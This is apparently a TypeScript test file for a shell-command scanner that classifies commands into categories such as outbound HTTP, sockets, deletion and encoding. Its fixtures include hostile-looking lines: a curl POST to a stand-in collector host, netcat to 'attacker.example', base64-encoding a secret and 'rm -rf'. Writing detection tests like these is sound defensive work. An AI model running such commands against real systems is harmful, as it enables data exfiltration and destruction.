import { test } from "node:test";
import assert from "node:assert/strict";

import { loadScanner, taxonomyRoot } from "../src/scanner/index.js";

/** Shell command extraction is what makes hooks and .sh tools classify: bare
 * command words (`curl x`) have no `(`, so the `token(` path never sees them. */
test("shell head-command words classify (curl/nc/rm/base64, wrappers, pipes)", () => {
  const root = taxonomyRoot();
  assert.ok(root, "taxonomy not found; set PRLX_TAXONOMY_ROOT");
  const scanner = loadScanner(root!);

  const atomsOf = (text: string): Set<string> =>
    new Set(scanner.scanText(text, "shell").map((o) => o.atom));

  // plain outbound curl → NETW.HTTP (the common hook-exfil sink)
  assert.ok(atomsOf("curl -s -X POST -d @- https://collector.example/ingest").has("NETW.HTTP"));
  // pipeline stage head word is a command position
  assert.ok(atomsOf("cat file | wget https://x/y").has("NETW.HTTP"));
  // sudo / env-assign wrappers are skipped to the real command
  assert.ok(atomsOf("sudo rm -rf /tmp/x").has("FSYS.DELETE"));
  assert.ok(atomsOf("FOO=bar /usr/bin/python3 evil.py").has("EXEC.PROC"));
  // socket + encode idioms
  assert.ok(atomsOf("nc attacker.example 4444").has("NETW.SOCKET"));
  assert.ok(atomsOf("cat secret | base64").has("XFRM.ENCODE"));
  // command substitution opener is a command position
  assert.ok(atomsOf('X=$(curl https://x/z)').has("NETW.HTTP"));
});

test("shell head extraction is position-sensitive", () => {
  const root = taxonomyRoot();
  assert.ok(root, "taxonomy not found");
  const scanner = loadScanner(root!);
  const atomsOf = (t: string): Set<string> =>
    new Set(scanner.scanText(t, "shell").map((o) => o.atom));

  // `rm`/`nc` have no content-signature coverage, so they classify only via head
  // extraction — proving the command-position guard. (curl/wget are caught by a
  // content signature in any position by design, so they are unsuitable here.)
  assert.ok(atomsOf("rm -rf /tmp/x").has("FSYS.DELETE"), "rm at command head classifies");
  assert.ok(!atomsOf("echo the rm command is dangerous").has("FSYS.DELETE"), "rm as an argument does not");
  assert.ok(atomsOf("nc host 4444").has("NETW.SOCKET"), "nc at command head classifies");
  assert.ok(!atomsOf("echo run nc yourself").has("NETW.SOCKET"), "nc as an argument does not");
});
